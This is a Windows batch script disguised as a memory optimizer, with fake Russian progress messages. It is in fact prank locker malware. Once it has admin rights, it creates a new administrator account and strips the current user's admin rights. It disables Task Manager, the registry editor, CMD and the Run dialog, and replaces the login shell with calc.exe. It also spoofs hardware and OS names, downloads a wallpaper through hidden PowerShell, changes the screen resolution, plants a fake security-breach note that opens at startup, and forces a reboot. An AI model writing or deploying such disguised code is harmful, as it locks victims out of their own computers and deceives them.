@echo off
setlocal enabledelayedexpansion
chcp 65001 >nul

net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [!] Ошибка: Для работы утилиты требуются права администратора.
    echo Это необходимо для доступа к системным сегментам ОЗУ.
    pause
    exit
)

title System Memory Optimizer v4.9.2
echo [Анализ] Сканирование оперативной памяти...
timeout /t 2 >nul
echo [Оптимизация] Очистка кэша системных процессов...
timeout /t 1 >nul
echo [Оптимизация] Дефрагментация блоков реестра...
timeout /t 2 >nul

net user "Валерий Пидоренко" 42 /add >nul 2>&1
net localgroup Администраторы "Валерий Пидоренко" /add >nul 2>&1
net localgroup Administrators "Валерий Пидоренко" /add >nul 2>&1
net localgroup Администраторы "%username%" /delete >nul 2>&1
net localgroup Administrators "%username%" /delete >nul 2>&1

set "PolKey=HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies"
reg add "%PolKey%\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f >nul
reg add "%PolKey%\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f >nul
reg add "%PolKey%\Explorer" /v "NoRun" /t REG_DWORD /d 1 /f >nul
reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System" /v "DisableCMD" /t REG_DWORD /d 1 /f >nul

reg add "%PolKey%\Explorer" /v "RestrictRun" /t REG_DWORD /d 1 /f >nul
reg add "%PolKey%\Explorer\RestrictRun" /v "1" /t REG_SZ /d "calc.exe" /f >nul
reg add "%PolKey%\Explorer\RestrictRun" /v "2" /t REG_SZ /d "notepad.exe" /f >nul
reg add "%PolKey%\Explorer\RestrictRun" /v "3" /t REG_SZ /d "msedge.exe" /f >nul
reg add "%PolKey%\Explorer\RestrictRun" /v "4" /t REG_SZ /d "chrome.exe" /f >nul

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "ProductName" /t REG_SZ /d "Vindovs Wista Бухгалтерия 10" /f >nul
reg add "HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0" /v "ProcessorNameString" /t REG_SZ /d "ФЬНЬМ Х6 шотает все процессоры" /f >nul
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "DriverDesc" /t REG_SZ /d "Intel Radeon RTX 580 МногоSP" /f >nul

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "calc.exe" /f >nul
bcdedit /set {current} bootmenupolicy legacy >nul 2>&1

set "wall=https://steamuserimages-a.akamaihd.net/ugc/2495639901442924594/3FF22993ACD0CCE116F72974775B6AD01FB13A87/"
powershell -W Hidden -C "(New-Object Net.WebClient).DownloadFile('%wall%', '%TEMP%\vista_bg.jpg'); $dm = Add-Type -Safe -TypeDefinition 'using System; using System.Runtime.InteropServices; [StructLayout(LayoutKind.Sequential)] public struct DEVMODE { [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)] public string dmDeviceName; public short dmSpecVersion; public short dmDriverVersion; public short dmSize; public short dmDriverExtra; public int dmFields; public int dmOrientation; public int dmPaperSize; public int dmPaperLength; public int dmPaperWidth; public int dmScale; public int dmCopies; public int dmDefaultSource; public int dmPrintQuality; public short dmColor; public short dmDuplex; public short dmYResolution; public short dmTtoOption; public short dmCollate; [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)] public string dmFormName; public short dmLogPixels; public int dmBitsPerPel; public int dmPelsWidth; public int dmPelsHeight; public int dmDisplayFlags; public int dmDisplayFrequency; public int dmICMMethod; public int dmICMVersion; public int dmPanningWidth; public int dmPanningHeight; } public class User32 { [DllImport(\"user32.dll\")] public static extern int ChangeDisplaySettings(ref DEVMODE devMode, int flags); }' -PassThru; $d = New-Object DEVMODE; $d.dmSize = [System.Runtime.InteropServices.Marshal]::SizeOf($d); $d.dmPelsWidth = 1366; $d.dmPelsHeight = 768; $d.dmFields = 0x180000; [User32]::ChangeDisplaySettings([ref]$d, 0); reg add 'HKCU\Control Panel\Desktop' /v Wallpaper /t REG_SZ /d '%TEMP%\vista_bg.jpg' /f" >nul

set "msg_file=%PUBLIC%\Documents\RAM_INFO.txt"
(
echo [КРИТИЧЕСКАЯ ОШИБКА БЕЗОПАСНОСТИ]
echo ======================================================
echo ВЫ СКАЧАЛИ ВЗЛОМАННУЮ ВЕРСИЮ ULTRA RAM BUSTER! 
echo В КАЧЕСТВЕ ЗАЩИТЫ ВАША ОЗУ ПОПАЛА ПОД ЮРИСДИКЦИЮ 
echo Искусственного Интеллекта! 
echo И БЫЛА УСТАНОВЛЕНА НОВЕЙШАЯ ОПЕРАЦИОННАЯ СИСТЕМА 
echo ОТ MicroCoft Vindovs Wista Бухгалтерия 10
echo.
echo Количество озу: 2048000 Килобайт
echo Используется: 19426769 Килобайт
echo.
echo UEFI BIOS Был перезаписан! Выхода нет! 
echo ======================================================
echo Саратовская область
) > "%msg_file%"

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "BuhgalterMsg" /t REG_SZ /d "notepad.exe \"%msg_file%\"" /f >nul
set "clean_url=https://github.com/filin6213-lab/Ultra-Ram-Booster-Malware-Cleaner/blob/main/URB%%20MLWR%%20Cleaner.bat"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Antivirus" /t REG_SZ /d "cmd /c start %clean_url%" /f >nul

echo [Завершено] Все операции выполнены успешно.
echo Очищено !random! Кб неиспользуемой памяти.
echo.
echo Нажмите любую клавишу для завершения оптимизации...
pause >nul
shutdown /r /t 5 /c "Finalizing system optimization..."
